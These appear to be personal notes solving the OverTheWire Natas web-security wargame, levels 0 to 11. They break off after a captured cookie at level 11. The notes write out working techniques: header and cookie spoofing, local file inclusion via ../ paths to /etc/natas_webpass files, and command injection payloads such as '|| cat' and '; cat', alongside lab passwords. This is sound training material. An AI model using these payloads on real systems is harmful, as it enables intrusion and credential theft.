http://overthewire.org/wargames/natas/
https://jhalon.github.io/over-the-wire-natas1/
 
 Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

natas0:
You can find the password for the next level on this page. 

Solution: Inspect Element
The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto 

natas1: 
You can find the password for the next level on this page, but rightclicking has been blocked! 

Solution: Right click worked, inspect element also accessible w/ F12
The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 

natas2:
There is nothing on this page 

Solution: Inspect element, shows <img src="files/pixel.png">
We can add /files to the end of the URL to reveal more files.
http://natas2.natas.labs.overthewire.org/files/
users.txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

natas3:
There is nothing on this page 

Solution: Inspect Element has clue:
There is nothing on this page
<!--No more information leaks!! Not even Google will find it this time...-->
This is a reference to robots.txt (more at http://www.robotstxt.org/)
Append /robots.txt to the url
http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
Append /s3cr3t to URL:
http://natas3.natas.labs.overthewire.org/s3cr3t/
users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

natas4:
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 

Solution: We need to spoof a proxy

Burpsuite > Proxy > Options
Proxy Listener should be set to 127.0.0.1:8080

Firefox > enable FoxyProxy (use proxy Burp for all URLS)

Reload the URL

Burpsuite > Proxy > Intercept
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas4.natas.labs.overthewire.org/
Cookie: __cfduid=d932546d0a76d6c5d413365ee7452c2291559513158
DNT: 1
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1

The Referer is natas4, change it to natas 5:
Referer: http://natas5.natas.labs.overthewire.org/

Burp > Forward

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq  

natas5:
Access disallowed. You are not logged in

Solution: Let's try and intercept with burp again!

GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=d932546d0a76d6c5d413365ee7452c2291559513158; loggedin=0
DNT: 1
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

change loggedin=0 to loggedin=1 and forward it!

Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

natas6:
There is a textbox that says 'input secret' and an option to view source code.

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


PHP source code always begins with <? and ends with ?>
That portion of the code includes a file and checks if it is
the same as the user input. If it is, access is granted.

Navigating to http://natas6.natas.labs.overthewire.org/includes/secret.inc
gives a blank page. Inspect element reveals the clue!

?
$secret = "FOEIUWGHFEEUHOFUOIU";
?

Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

#########
natas7
########

natas7 has 2 links: Home, About

Appending foo to URL gives the error message
Warning: include(help): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening 'help' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21

Inspecting the page shows:
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

https://wiki.owasp.org/index.php/Testing_for_Local_File_Inclusion

Sure enough, appending ../path gives us the file!
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

######
natas8
######

Like natas6, the page prompts for a secret and has a link to source code.
Part of the code reads:

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>


So we need to find the value of $secret.
It looks like we can simply take this line of code and reverse it:

bin2hex(strrev(base64_encode($secret)));
becomes (pseudocode working backwards):
base64_decode, strrev, hex2bin, $encodedSecret

Since the above is PHP code, we can probably use PHP to reverse the function.
Run php -a to activate Interactive mode for PHP and pass in the new function.

ryan@kali:~$ php -a
Interactive mode enabled

php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq

Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 

######
natas9
######

Page reads
Find words containing:
With a link to source code

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>

This seems SQL-injectiony
inputting joiewajfoajea || ls outputs dictionary.txt

OverTheWire tells us that passwords are stored in /etc/natas_webpass/{level}
We want the password for natas10
Input: zzz || cat /etc/natas_webpass/natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

Note: we can also use a semicolon to pass commands, i.e.,
foo; cat /etc/natas_webpass/natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

#######
natas10
#######
Similar to 9, but now says: For security reasons, we now filter on certain characters || input says there is an illegal character.  Fortunately there is a source code link.  
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>

Looks like we cannot insert / ; | & characters.
Can we exploit the line grep -i $key dictionary.txt?

The command reads grep $key (case-insensitive) at dictionary.txt
grep is likely in /bin/grep or /usr/bin/grep (from whereis grep)
grep can search multiple files

We can ask grep to search multiple files for a string
foo /etc/natas_webpass/natas11
searches the natas11 password file and outputs a match.
If we use a single letter we should find a match

a /etc/natas_webpass/natas11
Only dictionary.txt output

c /etc/natas_webpass/natas11
Output:

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:American

U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

#######
natas11
#######

Cookies are protected with XOR encryption.
Background color: 
View Source code

PHP in source code reads:

<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>


Burp gets a cookie!
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
